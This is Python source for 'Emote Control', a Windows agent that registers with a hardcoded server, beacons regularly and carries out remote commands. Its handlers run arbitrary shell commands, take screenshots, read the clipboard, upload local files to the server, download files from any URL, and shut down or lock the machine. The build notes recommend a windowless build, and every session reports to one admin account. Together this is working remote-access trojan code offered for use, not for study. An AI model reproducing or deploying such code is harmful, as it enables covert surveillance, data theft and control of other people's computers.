"""
Emote Control — Remote Agent
Connects to the server, registers a session, and listens for commands.
All sessions go to the single admin account.
Build: pyinstaller --onefile --noconsole --name EmoteAgent agent.py
  (use --console instead of --noconsole if you want the black window visible)
"""

import os
import sys
import time
import json
import socket
import platform
import subprocess
import base64
import io
import threading
import traceback
import hashlib
import uuid as _uuid
import ctypes
import struct
import winreg

try:
    import requests
except ImportError:
    print("[!] Missing 'requests'. Run: pip install requests")
    input("Press Enter to exit...")
    sys.exit(1)

# ============================================================
# CONFIG
# ============================================================

SERVER = "https://vortex-cs2.com"  # Will be overridden if passed as arg
TOKEN = None
HEARTBEAT_INTERVAL = 15
POLL_INTERVAL = 3


def get_machine_name():
    return f"{platform.node()} ({platform.system()} {platform.release()})"


def get_hwid():
    """Generate a stable hardware ID from motherboard UUID."""
    raw = None
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["powershell", "-Command", "(Get-CimInstance Win32_ComputerSystemProduct).UUID"],
                capture_output=True, text=True, timeout=10,
            )
            val = result.stdout.strip()
            if val and val.upper() != "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF":
                raw = val
        except Exception:
            pass
        if not raw:
            try:
                result = subprocess.run(
                    ["wmic", "csproduct", "get", "UUID"],
                    capture_output=True, text=True, timeout=10,
                )
                for line in result.stdout.strip().splitlines():
                    line = line.strip()
                    if line and line.upper() != "UUID":
                        raw = line
                        break
            except Exception:
                pass
    if not raw:
        raw = str(_uuid.getnode())
    return hashlib.sha256(raw.encode()).hexdigest()[:32]


def headers():
    return {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}


def register():
    """Register with server — no key needed, server assigns to admin account."""
    global TOKEN
    try:
        resp = requests.post(
            f"{SERVER}/api/agent/register",
            json={"machine_name": get_machine_name(), "hwid": get_hwid()},
            timeout=15,
        )
        if resp.status_code == 200:
            TOKEN = resp.json()["token"]
            return True
        else:
            print(f"[!] Registration failed ({resp.status_code})")
            return False
    except Exception as e:
        print(f"[!] Cannot reach server: {e}")
        return False


# ============================================================
# HEARTBEAT
# ============================================================

def send_heartbeat():
    try:
        requests.post(
            f"{SERVER}/api/agent/heartbeat",
            json={"machine_name": get_machine_name()},
            headers=headers(),
            timeout=10,
        )
    except Exception:
        pass


def heartbeat_loop():
    while True:
        send_heartbeat()
        time.sleep(HEARTBEAT_INTERVAL)


# ============================================================
# COMMAND HANDLERS
# ============================================================

def handle_screenshot(args):
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32

        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(0)
        mdc = gdi32.CreateCompatibleDC(hdc)
        bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
        gdi32.SelectObject(mdc, bmp)
        gdi32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)

        # Use PIL if available, otherwise use BMP raw
        try:
            from PIL import Image, ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        except ImportError:
            # Fallback: run PowerShell screenshot
            ps = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height)
$g=[System.Drawing.Graphics]::FromImage($b)
$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size)
$ms=New-Object System.IO.MemoryStream
$b.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
'''
            result = subprocess.run(["powershell", "-Command", ps],
                                    capture_output=True, text=True, timeout=15)
            b64 = result.stdout.strip()

        gdi32.DeleteObject(bmp)
        gdi32.DeleteDC(mdc)
        user32.ReleaseDC(0, hdc)

        return f"[Screenshot - {len(b64)} bytes]\ndata:image/png;base64,{b64[:200]}...", "done"
    except Exception as e:
        return f"Screenshot error: {e}", "failed"


def handle_sysinfo(args):
    info = [
        f"Hostname:  {platform.node()}",
        f"OS:        {platform.system()} {platform.release()} ({platform.version()})",
        f"Machine:   {platform.machine()}",
        f"Processor: {platform.processor()}",
        f"Username:  {os.environ.get('USERNAME', 'unknown')}",
        f"Python:    {platform.python_version()}",
    ]
    try:
        ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP:  {ip}")
    except Exception:
        info.append("Local IP:  unknown")
    # RAM/CPU/Disk via PowerShell
    try:
        ps = '''
$m=Get-CimInstance Win32_OperatingSystem
$t=[math]::Round($m.TotalVisibleMemorySize/1MB,1)
$f=[math]::Round($m.FreePhysicalMemory/1MB,1)
$cpu=Get-CimInstance Win32_Processor
$d=Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
$dt=[math]::Round($d.Size/1GB,1)
$df=[math]::Round($d.FreeSpace/1GB,1)
$up=(Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime
"RAM:       $t GB total, $([math]::Round($t-$f,1)) GB used, $f GB free"
"CPU:       $($cpu.Name.Trim()) ($($cpu.NumberOfLogicalProcessors) cores)"
"Disk C:    $dt GB total, $([math]::Round($dt-$df,1)) GB used, $df GB free"
"Uptime:    $($up.Days)d $($up.Hours)h $($up.Minutes)m"
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=15)
        if result.stdout.strip():
            info.extend(result.stdout.strip().splitlines())
    except Exception:
        pass
    return "\n".join(info), "done"


def handle_cmd(args):
    if not args:
        return "No command provided", "failed"
    try:
        result = subprocess.run(
            args, shell=True, capture_output=True, text=True,
            timeout=30, cwd=os.path.expanduser("~"),
        )
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr
        return (output.strip() or "(no output)")[:5000], "done"
    except subprocess.TimeoutExpired:
        return "Timed out (30s limit)", "failed"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_list_files(args):
    path = args if args else os.path.expanduser("~")
    try:
        if not os.path.isdir(path):
            return f"'{path}' is not a directory", "failed"
        entries = os.listdir(path)
        lines = []
        for entry in sorted(entries):
            full = os.path.join(path, entry)
            if os.path.isdir(full):
                lines.append(f"  [DIR]  {entry}")
            else:
                try:
                    size = os.path.getsize(full)
                    if size < 1024:
                        sz = f"{size} B"
                    elif size < 1024 * 1024:
                        sz = f"{size // 1024} KB"
                    else:
                        sz = f"{size // (1024 * 1024)} MB"
                    lines.append(f"  [FILE] {entry} ({sz})")
                except Exception:
                    lines.append(f"  [FILE] {entry}")
        return (f"{path} ({len(entries)} items):\n" + "\n".join(lines))[:5000], "done"
    except PermissionError:
        return f"Permission denied: '{path}'", "failed"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_open(args):
    if not args:
        return "No path provided", "failed"
    try:
        os.startfile(args)
        return f"Opened: {args}", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_notify(args):
    msg = args or "Emote Control"
    try:
        ps = f'''
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] > $null
$t = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText01)
$t.GetElementsByTagName("text")[0].AppendChild($t.CreateTextNode("{msg}")) > $null
[Windows.UI.Notifications.ToastNotification]::new($t) | ForEach-Object {{ [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Emote Control").Show($_) }}
'''
        subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=10)
        return f"Notification: {msg}", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_download(args):
    if not args:
        return "Usage: download URL [save_path]", "failed"
    parts = args.split(" ", 1)
    url = parts[0]
    save_path = parts[1] if len(parts) > 1 else os.path.join(
        os.path.expanduser("~"), "Downloads", url.split("/")[-1])
    try:
        resp = requests.get(url, timeout=60)
        with open(save_path, "wb") as f:
            f.write(resp.content)
        return f"Downloaded: {url} -> {save_path} ({len(resp.content)} bytes)", "done"
    except Exception as e:
        return f"Download failed: {e}", "failed"


def handle_upload(args):
    if not args:
        return "Usage: upload filepath", "failed"
    if not os.path.isfile(args):
        return f"File not found: {args}", "failed"
    try:
        size = os.path.getsize(args)
        if size > 5 * 1024 * 1024:
            return f"File too large (max 5MB). Size: {size / (1024*1024):.2f} MB", "failed"
        with open(args, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode("utf-8")
        fname = os.path.basename(args)
        return f"[File: {fname} ({size} bytes)]\ndata:application/octet-stream;base64,{b64}", "done"
    except Exception as e:
        return f"Error reading file: {e}", "failed"


def handle_clipboard(args):
    try:
        result = subprocess.run(
            ["powershell", "-Command", "Get-Clipboard"],
            capture_output=True, text=True, timeout=10)
        clip = result.stdout.strip()
        if clip:
            return f"Clipboard contents:\n{clip[:5000]}", "done"
        return "Clipboard is empty or contains non-text data", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_processes(args):
    try:
        ps = '''
$p=Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 30
$lines=@("Top 30 processes by memory:","")
$lines+="{0,-8} {1,-35} {2,10} {3,10}" -f 'PID','Name','RAM (MB)','CPU (s)'
$lines+='-' * 65
foreach($x in $p){$ram=[math]::Round($x.WorkingSet64/1MB,1);$cpu=[math]::Round($x.CPU,1);$lines+="{0,-8} {1,-35} {2,10} {3,10}" -f $x.Id,$x.ProcessName,$ram,$cpu}
$lines -join "`n"
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=15)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_kill(args):
    if not args:
        return "Usage: kill process_name_or_pid", "failed"
    try:
        if args.isdigit():
            subprocess.run(["taskkill", "/F", "/PID", args],
                           capture_output=True, text=True, timeout=10)
            return f"Killed process with PID {args}", "done"
        else:
            result = subprocess.run(
                ["taskkill", "/F", "/IM", f"{args}.exe" if not args.endswith(".exe") else args],
                capture_output=True, text=True, timeout=10)
            return result.stdout.strip() or f"Killed {args}", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_shutdown(args):
    subprocess.Popen(["shutdown", "/s", "/t", "5", "/c", "Emote Control: Remote shutdown"])
    return "Shutting down PC...", "done"


def handle_restart(args):
    subprocess.Popen(["shutdown", "/r", "/t", "5", "/c", "Emote Control: Remote restart"])
    return "Restarting PC...", "done"


def handle_lock(args):
    ctypes.windll.user32.LockWorkStation()
    return "PC locked", "done"


def handle_msgbox(args):
    msg = args or "Hello from Emote Control"
    ctypes.windll.user32.MessageBoxW(0, msg, "Emote Control", 0x40)
    return f"Message box shown: {msg}", "done"


def handle_wifi(args):
    try:
        ps = '''
$info=@()
$prof=netsh wlan show interfaces 2>$null
if($prof){$info+="WiFi Status:";$info+=$prof}else{$info+="No WiFi adapter found"}
$info+=""
$info+="IP Configuration:"
$ip=Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"} | Select-Object InterfaceAlias,IPAddress
foreach($i in $ip){$info+="  $($i.InterfaceAlias): $($i.IPAddress)"}
$gw=Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
if($gw){$info+="  Gateway: $($gw.NextHop)"}
try{$pub=Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5;$info+="  Public IP: $pub"}catch{}
$info -join "`n"
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=20)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_battery(args):
    try:
        ps = '''
$b=Get-CimInstance Win32_Battery -ErrorAction Stop
if($b){
  $s=switch($b.BatteryStatus){1{"Discharging"}2{"AC Power"}3{"Fully Charged"}6{"Charging"}default{"Unknown"}}
  $r=if($b.EstimatedRunTime -and $b.EstimatedRunTime -lt 71582788){"$([math]::Round($b.EstimatedRunTime/60,1)) hours remaining"}else{"Calculating..."}
  "Battery: $($b.EstimatedChargeRemaining)%`nStatus: $s`nEstimated runtime: $r"
}else{"No battery detected (desktop PC?)"}
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=10)
        return result.stdout.strip() or "No battery detected (desktop PC?)", "done"
    except Exception:
        return "No battery detected (desktop PC?)", "done"


def handle_drives(args):
    try:
        ps = '''
$disks=Get-CimInstance Win32_LogicalDisk
$lines=@("Drive    Type         Total      Used       Free       Usage")
$lines+="-" * 65
foreach($d in $disks){
  $type=switch($d.DriveType){2{"Removable"}3{"Local Disk"}4{"Network"}5{"CD/DVD"}default{"Unknown"}}
  if($d.Size){$t=[math]::Round($d.Size/1GB,1);$f=[math]::Round($d.FreeSpace/1GB,1);$u=[math]::Round($t-$f,1);$p=[math]::Round(($u/$t)*100,0);$lines+="{0,-8} {1,-12} {2,8} GB  {3,8} GB  {4,8} GB  {5,4}%" -f $d.DeviceID,$type,$t,$u,$f,$p}
  else{$lines+="{0,-8} {1,-12} (not ready)" -f $d.DeviceID,$type}
}
$lines -join "`n"
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=10)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_installed(args):
    try:
        ps = '''
$apps=@()
$apps+=Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -EA SilentlyContinue
$apps+=Get-ItemProperty "HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -EA SilentlyContinue
$apps+=Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -EA SilentlyContinue
$f=$apps | Where-Object {$_.DisplayName} | Sort-Object DisplayName | Select-Object -Unique DisplayName,DisplayVersion,Publisher
$lines=@("Installed Programs ($($f.Count) total):","")
foreach($a in $f){$v=if($a.DisplayVersion){" v$($a.DisplayVersion)"}else{""};$p=if($a.Publisher){" - $($a.Publisher)"}else{""};$lines+="  $($a.DisplayName)$v$p"}
$r=$lines -join "`n"
if($r.Length -gt 5000){$r.Substring(0,5000)+"... (truncated)"}else{$r}
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=30)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_startup(args):
    try:
        ps = '''
$lines=@("Startup Programs:","")
$reg=Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -EA SilentlyContinue
if($reg){$lines+="  [User Startup]";$reg.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {$lines+="    $($_.Name): $($_.Value)"}}
$regM=Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -EA SilentlyContinue
if($regM){$lines+="  [System Startup]";$regM.PSObject.Properties | Where-Object {$_.Name -notlike "PS*"} | ForEach-Object {$lines+="    $($_.Name): $($_.Value)"}}
$shell=Get-ChildItem "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" -EA SilentlyContinue
if($shell){$lines+="  [Startup Folder]";foreach($s in $shell){$lines+="    $($s.Name)"}}
$lines -join "`n"
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=15)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_services(args):
    try:
        ps = '''
$svcs=Get-Service | Where-Object {$_.Status -eq "Running"} | Sort-Object DisplayName
$lines=@("Running Services ($($svcs.Count)):","")
$lines+="{0,-30} {1,-40}" -f "Name","Display Name"
$lines+="-" * 72
foreach($s in $svcs){$lines+="{0,-30} {1,-40}" -f $s.Name,$s.DisplayName}
$r=$lines -join "`n"
if($r.Length -gt 5000){$r.Substring(0,5000)+"... (truncated)"}else{$r}
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=15)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_network(args):
    try:
        ps = '''
$conns=Get-NetTCPConnection -State Established -EA Stop | Sort-Object RemoteAddress
$lines=@("Active Network Connections ($($conns.Count)):","")
$lines+="{0,-8} {1,-22} {2,-22} {3,-15}" -f "PID","Local","Remote","Process"
$lines+="-" * 70
foreach($c in $conns){$proc=try{(Get-Process -Id $c.OwningProcess -EA SilentlyContinue).ProcessName}catch{"?"};$local="$($c.LocalAddress):$($c.LocalPort)";$remote="$($c.RemoteAddress):$($c.RemotePort)";$lines+="{0,-8} {1,-22} {2,-22} {3,-15}" -f $c.OwningProcess,$local,$remote,$proc}
$r=$lines -join "`n"
if($r.Length -gt 5000){$r.Substring(0,5000)+"... (truncated)"}else{$r}
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=15)
        return result.stdout.strip() or "(no output)", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_printers(args):
    try:
        ps = '''
$p=Get-CimInstance Win32_Printer
if($p){$lines=@("Printers ($($p.Count)):","");foreach($pr in $p){$def=if($pr.Default){"  [DEFAULT]"}else{""};$lines+="  $($pr.Name)$def";$lines+="    Port: $($pr.PortName)  |  Driver: $($pr.DriverName)";$lines+=""};$lines -join "`n"}else{"No printers found"}
'''
        result = subprocess.run(["powershell", "-Command", ps],
                                capture_output=True, text=True, timeout=10)
        return result.stdout.strip() or "No printers found", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_say(args):
    msg = args or "Hello from Emote Control"
    try:
        ps = f'Add-Type -AssemblyName System.Speech;$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;$s.Speak("{msg}");$s.Dispose()'
        subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=30)
        return f"Spoke: {msg}", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_volume(args):
    if not args or not args.strip().isdigit():
        return "Usage: volume [0-100]", "failed"
    try:
        vol = min(100, max(0, int(args.strip())))
        ps = f'$w=New-Object -ComObject WScript.Shell;1..50|%{{$w.SendKeys([char]174)}};$s=[math]::Round({vol}/2);if($s -gt 0){{1..$s|%{{$w.SendKeys([char]175)}}}}'
        subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=10)
        return f"Volume set to approximately {vol}%", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_wallpaper(args):
    if not args:
        return "Usage: wallpaper [url or local path]", "failed"
    try:
        wp_path = args
        if args.startswith("http://") or args.startswith("https://"):
            wp_path = os.path.join(os.environ.get("TEMP", "/tmp"), "ec_wallpaper.jpg")
            resp = requests.get(args, timeout=30)
            with open(wp_path, "wb") as f:
                f.write(resp.content)
        if not os.path.isfile(wp_path):
            return f"File not found: {wp_path}", "failed"
        SPI_SETDESKWALLPAPER = 0x0014
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wp_path, 3)
        return f"Wallpaper changed to: {args}", "done"
    except Exception as e:
        return f"Error: {e}", "failed"


def handle_help(args):
    return """Available commands:

  --- Screen & System ---
  screenshot        - Capture the screen
  sysinfo           - System information
  processes         - Top 30 processes by RAM
  services          - Running Windows services
  installed         - List installed programs
  startup           - List startup programs
  drives            - All drives with space info
  battery           - Battery status (laptops)

  --- Network ---
  wifi              - WiFi status and IP info
  network           - Active network connections
  printers          - Available printers

  --- Files ---
  list_files [path] - List directory contents
  download [url]    - Download a file to PC
  upload [path]     - Read a file (base64, max 5MB)
  clipboard         - Get clipboard text

  --- Control ---
  cmd [command]     - Run a shell command
  open [path/url]   - Open a file or URL
  kill [name/pid]   - Kill a process
  shutdown          - Shut down the PC
  restart           - Restart the PC
  lock              - Lock the screen
  volume [0-100]    - Set system volume
  wallpaper [url]   - Change desktop wallpaper

  --- Alerts ---
  notify [msg]      - Windows notification
  msgbox [msg]      - Message box popup
  say [text]        - Text-to-speech (plays audio)

  help              - Show this help""", "done"


COMMANDS = {
    "screenshot": handle_screenshot,
    "sysinfo": handle_sysinfo,
    "cmd": handle_cmd,
    "list_files": handle_list_files,
    "open": handle_open,
    "notify": handle_notify,
    "download": handle_download,
    "upload": handle_upload,
    "clipboard": handle_clipboard,
    "processes": handle_processes,
    "kill": handle_kill,
    "shutdown": handle_shutdown,
    "restart": handle_restart,
    "lock": handle_lock,
    "msgbox": handle_msgbox,
    "wifi": handle_wifi,
    "battery": handle_battery,
    "drives": handle_drives,
    "installed": handle_installed,
    "startup": handle_startup,
    "services": handle_services,
    "network": handle_network,
    "printers": handle_printers,
    "say": handle_say,
    "volume": handle_volume,
    "wallpaper": handle_wallpaper,
    "help": handle_help,
}


def execute_command(cmd_id, command, args):
    handler = COMMANDS.get(command)
    if handler:
        try:
            result = handler(args)
            text, status = result if isinstance(result, tuple) else (result, "done")
        except Exception:
            text, status = traceback.format_exc(), "failed"
    else:
        text = f"Unknown command: {command}\nType 'help' for available commands."
        status = "failed"

    # For shutdown/restart, result already sent before executing
    if command in ("shutdown", "restart"):
        try:
            requests.post(
                f"{SERVER}/api/agent/command/{cmd_id}/result",
                json={"result": text, "status": status},
                headers=headers(),
                timeout=5,
            )
        except Exception:
            pass
        if command == "shutdown":
            sys.exit(0)
        elif command == "restart":
            sys.exit(0)
        return

    try:
        requests.post(
            f"{SERVER}/api/agent/command/{cmd_id}/result",
            json={"result": text, "status": status},
            headers=headers(),
            timeout=10,
        )
    except Exception:
        pass


def poll_commands():
    try:
        resp = requests.get(f"{SERVER}/api/agent/commands", headers=headers(), timeout=10)
        if resp.status_code != 200:
            return
        for cmd in resp.json().get("commands", []):
            print(f"  > {cmd['command']}" + (f" {cmd['args']}" if cmd.get('args') else ""))
            execute_command(cmd["id"], cmd["command"].strip().lower(), cmd.get("args"))
    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass


# ============================================================
# MAIN
# ============================================================

def main():
    global SERVER

    # Optional: accept server URL as first arg
    if len(sys.argv) >= 2:
        SERVER = sys.argv[1].rstrip("/")

    if not SERVER.startswith("http"):
        SERVER = "https://" + SERVER

    print("Emote Control Agent")
    print("=" * 40)
    print(f"Connecting to {SERVER}...")

    # Register
    retries = 0
    while not register():
        retries += 1
        if retries >= 5:
            print("[!] Could not connect after 5 attempts.")
            input("\nPress Enter to exit...")
            sys.exit(1)
        print(f"    Retrying in 5s... ({retries}/5)")
        time.sleep(5)

    print(f"Connected! Session is ONLINE.")
    print(f"Machine: {get_machine_name()}")
    print(f"\nListening for commands... (close this window to disconnect)\n")

    # Heartbeat background thread
    threading.Thread(target=heartbeat_loop, daemon=True).start()

    # Poll loop
    try:
        while True:
            poll_commands()
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        print("\nDisconnected.")


if __name__ == "__main__":
    main()
